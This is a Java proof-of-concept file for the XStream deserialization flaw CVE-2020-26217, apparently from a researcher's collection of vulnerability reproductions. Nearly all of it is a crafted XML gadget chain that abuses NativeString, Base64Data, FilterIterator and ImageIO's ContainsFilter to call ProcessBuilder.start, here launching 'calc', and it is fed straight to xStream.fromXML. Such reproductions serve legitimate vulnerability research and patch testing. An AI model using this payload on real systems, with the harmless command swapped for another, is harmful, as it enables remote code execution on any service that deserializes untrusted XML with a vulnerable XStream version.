package com.r17a.xstream.cve.hashmap;

import com.thoughtworks.xstream.XStream;

import java.io.IOException;

public class CVE_2020_26217 {
    public static void main(String[] args) throws IOException {
        XStream xStream = new XStream();
        String payload = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='java.io.SequenceInputStream'>\n" +
                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
                "                  <iter class='java.util.ArrayList$Itr'>\n" +
                "                    <cursor>0</cursor>\n" +
                "                    <lastRet>-1</lastRet>\n" +
                "                    <expectedModCount>1</expectedModCount>\n" +
                "                    <outer-class>\n" +
                "                      <java.lang.ProcessBuilder>\n" +
                "                        <command>\n" +
                "                          <string>calc</string>\n" +
                "                        </command>\n" +
                "                      </java.lang.ProcessBuilder>\n" +
                "                    </outer-class>\n" +
                "                  </iter>\n" +
                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
                "                    <method>\n" +
                "                      <class>java.lang.ProcessBuilder</class>\n" +
                "                      <name>start</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>start</name>\n" +
                "                  </filter>\n" +
                "                  <next/>\n" +
                "                </iterator>\n" +
                "                <type>KEYS</type>\n" +
                "              </e>\n" +
                "              <in class='java.io.ByteArrayInputStream'>\n" +
                "                <buf></buf>\n" +
                "                <pos>0</pos>\n" +
                "                <mark>0</mark>\n" +
                "                <count>0</count>\n" +
                "              </in>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        xStream.fromXML(payload);
    }
}
